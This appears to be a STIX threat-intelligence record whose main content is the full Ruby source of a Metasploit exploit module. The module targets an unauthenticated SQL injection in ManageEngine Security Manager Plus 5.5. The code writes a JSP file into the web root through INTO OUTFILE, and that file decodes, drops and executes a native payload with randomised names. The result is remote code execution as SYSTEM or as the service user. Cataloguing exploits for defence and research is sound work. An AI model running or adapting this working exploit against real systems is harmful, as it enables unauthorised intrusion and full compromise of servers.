{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4f4a5dc9-e337-430f-b249-a3a2d6e42e45",
    "created": "2024-08-14T17:09:52.379952Z",
    "modified": "2024-08-14T17:09:52.379957Z",
    "name": "\"ManageEngine Security Manager Plus 5.5 Build 5505 SQL Injection\"",
    "description": " This module exploits a SQL injection found in ManageEngine Security Manager Plus advanced search page, which results in remote code execution under the context of SYSTEM in Windows; or as the user in Linux.  Authentication is not required in order to exploit this vulnerability.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/manageengine_search_sqli.rb",
            "external_id": "manageengine_search_sqli.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::EXE\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"ManageEngine Security Manager Plus 5.5 Build 5505 SQL Injection\",\n      'Description'    => %q{\n          This module exploits a SQL injection found in ManageEngine Security Manager Plus\n        advanced search page, which results in remote code execution under the context of\n        SYSTEM in Windows; or as the user in Linux.  Authentication is not required in order\n        to exploit this vulnerability.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'xistence <xistence[at]0x90.nl>',  # Discovery & Metasploit module\n          'sinn3r',                          # Improved Metasploit module\n          'egypt'                            # Improved Metasploit module\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '86562'],\n          ['EDB','22094'],\n          ['BID', '56138']\n        ],\n      'Platform'       => %w{ linux win },\n      'Targets'        =>\n        [\n          ['Automatic', {}],\n          ['Windows',   { 'Arch' => ARCH_X86, 'Platform' => 'win'   }],\n          ['Linux',     { 'Arch' => ARCH_X86, 'Platform' => 'linux' }]\n        ],\n      'DefaultTarget'  => 0,\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-10-18'))\n\n    register_options(\n      [\n        OptPort.new('RPORT', [true, 'The target port', 6262])\n      ])\n  end\n\n\n  def check\n    res = sqli_exec(Rex::Text.rand_text_alpha(1))\n\n    if res and res.body =~ /Error during search/\n      return Exploit::CheckCode::Vulnerable\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n\n  def pick_target\n    return target if target.name != 'Automatic'\n\n    rnd_num   = Rex::Text.rand_text_numeric(1)\n    rnd_fname = Rex::Text.rand_text_alpha(5) + \".txt\"\n    clean_path= \"../webapps/SecurityManager/#{rnd_fname}\"\n    outpath   = \"../\" + clean_path\n\n    register_file_for_cleanup(clean_path)\n\n    sqli  = \"#{rnd_num})) union select @@version,\"\n    sqli << (2..28).map {|e| e} * \",\"\n    sqli << \" into outfile \\\"#{outpath}\\\" FROM mysql.user WHERE #{rnd_num}=((#{rnd_num}\"\n    sqli_exec(sqli)\n\n    res = send_request_raw({'uri'=>\"/#{rnd_fname}\"})\n\n    # What @@version returns:\n    # Linux   = 5.0.36-enterprise\n    # Windows = 5.0.36-enterprise-nt\n\n    if res and res.body =~ /\\d\\.\\d\\.\\d\\d\\-enterprise\\-nt/\n      print_status(\"#{rhost}:#{rport} - Target selected: #{targets[1].name}\")\n      return targets[1]  # Windows target\n    elsif res and res.body =~ /\\d\\.\\d\\.\\d\\d\\-enterprise/\n      print_status(\"#{rhost}:#{rport} - Target selected: #{targets[2].name}\")\n      return targets[2]\n    end\n\n    return nil\n  end\n\n  #\n  # Embeds our executable in JSP\n  #\n  def generate_jsp_payload\n    opts                = {:arch => @my_target.arch, :platform => @my_target.platform}\n    native_payload      = Rex::Text.encode_base64(generate_payload_exe(opts))\n    native_payload_name = Rex::Text.rand_text_alpha(rand(6)+3)\n    ext                 = (@my_target['Platform'] == 'win') ? '.exe' : '.bin'\n\n    var_raw     = Rex::Text.rand_text_alpha(rand(8) + 3)\n    var_ostream = Rex::Text.rand_text_alpha(rand(8) + 3)\n    var_buf     = Rex::Text.rand_text_alpha(rand(8) + 3)\n    var_decoder = Rex::Text.rand_text_alpha(rand(8) + 3)\n    var_tmp     = Rex::Text.rand_text_alpha(rand(8) + 3)\n    var_path    = Rex::Text.rand_text_alpha(rand(8) + 3)\n    var_proc2   = Rex::Text.rand_text_alpha(rand(8) + 3)\n\n    if @my_target['Platform'] == 'linux'\n      var_proc1 = Rex::Text.rand_text_alpha(rand(8) + 3)\n      chmod = %Q|\n      Process #{var_proc1} = Runtime.getRuntime().exec(\"chmod 777 \" + #{var_path});\n      Thread.sleep(200);\n      |\n\n      var_proc3 = Rex::Text.rand_text_alpha(rand(8) + 3)\n      cleanup = %Q|\n      Thread.sleep(200);\n      Process #{var_proc3} = Runtime.getRuntime().exec(\"rm \" + #{var_path});\n      |\n    else\n      chmod   = ''\n      cleanup = ''\n    end\n\n    jsp = %Q|\n    <%@page import=\"java.io.*\"%>\n    <%@page import=\"sun.misc.BASE64Decoder\"%>\n\n    <%\n    byte[] #{var_raw} = null;\n    BufferedOutputStream #{var_ostream} = null;\n    try {\n      String #{var_buf} = \"#{native_payload}\";\n\n      BASE64Decoder #{var_decoder} = new BASE64Decoder();\n      #{var_raw} = #{var_decoder}.decodeBuffer(#{var_buf}.toString());\n\n      File #{var_tmp} = File.createTempFile(\"#{native_payload_name}\", \"#{ext}\");\n      String #{var_path} = #{var_tmp}.getAbsolutePath();\n\n      #{var_ostream} = new BufferedOutputStream(new FileOutputStream(#{var_path}));\n      #{var_ostream}.write(#{var_raw});\n      #{var_ostream}.close();\n      #{chmod}\n      Process #{var_proc2} = Runtime.getRuntime().exec(#{var_path});\n      #{cleanup}\n    } catch (Exception e) {\n    }\n    %>\n    |\n\n    jsp = jsp.gsub(/\\n/, '')\n    jsp = jsp.gsub(/\\t/, '')\n\n    jsp.unpack(\"H*\")[0]\n  end\n\n  def sqli_exec(sqli_string)\n    cookie  = 'STATE_COOKIE=&'\n    cookie << 'SecurityManager/ID/174/HomePageSubDAC_LIST/223/SecurityManager_CONTENTAREA_LIST/226/MainDAC_LIST/166&'\n    cookie << 'MainTabs/ID/167/_PV/174/selectedView/Home&'\n    cookie << 'Home/ID/166/PDCA/MainDAC/_PV/174&'\n    cookie << 'HomePageSub/ID/226/PDCA/SecurityManager_CONTENTAREA/_PV/166&'\n    cookie << 'HomePageSubTab/ID/225/_PV/226/selectedView/HomePageSecurity&'\n    cookie << 'HomePageSecurity/ID/223/PDCA/HomePageSubDAC/_PV/226&'\n    cookie << '_REQS/_RVID/SecurityManager/_TIME/31337; '\n    cookie << '2RequestsshowThreadedReq=showThreadedReqshow; '\n    cookie << '2RequestshideThreadedReq=hideThreadedReqhide;'\n\n    state_id = Rex::Text.rand_text_numeric(5)\n\n    send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => \"/STATE_ID/#{state_id}/jsp/xmlhttp/persistence.jsp\",\n      'headers'   => {\n        'Cookie' => cookie,\n        'Accept-Encoding' => 'identity'\n      },\n      'vars_get'  => {\n        'reqType'    =>'AdvanceSearch',\n        'SUBREQUEST' =>'XMLHTTP'\n      },\n      'vars_post' => {\n        'ANDOR'       => 'and',\n        'condition_1' => 'OpenPorts@PORT',\n        'operator_1'  => 'IN',\n        'value_1'     => sqli_string,\n        'COUNT'       => '1'\n      }\n    })\n\n  end\n\n  #\n  # Run the actual exploit\n  #\n  def inject_exec(out)\n    hex_jsp = generate_jsp_payload\n    rnd_num = Rex::Text.rand_text_numeric(1)\n    sqli  = \"#{rnd_num})) union select 0x#{hex_jsp},\"\n    sqli << (2..28).map {|e| e} * \",\"\n    sqli << \" into outfile \\\"#{out}\\\" FROM mysql.user WHERE #{rnd_num}=((#{rnd_num}\"\n\n    print_status(\"#{rhost}:#{rport} - Trying SQL injection...\")\n    sqli_exec(sqli)\n\n    fname = \"/#{File.basename(out)}\"\n    print_status(\"#{rhost}:#{rport} - Requesting #{fname}\")\n    send_request_raw({'uri' => fname})\n\n    handler\n  end\n\n\n  def exploit\n    @my_target = pick_target\n    if @my_target.nil?\n      print_error(\"#{rhost}:#{rport} - Unable to select a target, we must bail.\")\n      return\n    end\n\n    jsp_name  = rand_text_alpha(rand(6)+3)\n    # The working directory when our payload runs is\n    # c:/AdventNet/SecurityManager/bin/\n    # while the jsp file will be in\n    # c:/AdventNet/SecurityManager/webapps/SecurityManager/\n    # so we need to adjust the traversal level.\n    clean_path= \"../webapps/SecurityManager/#{jsp_name + '.jsp'}\"\n    outpath   = \"../\" + clean_path\n\n    register_file_for_cleanup(clean_path)\n\n    inject_exec(outpath)\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-10-18",
    "x_mitre_platforms": [
        "%w{ linux win }"
    ]
}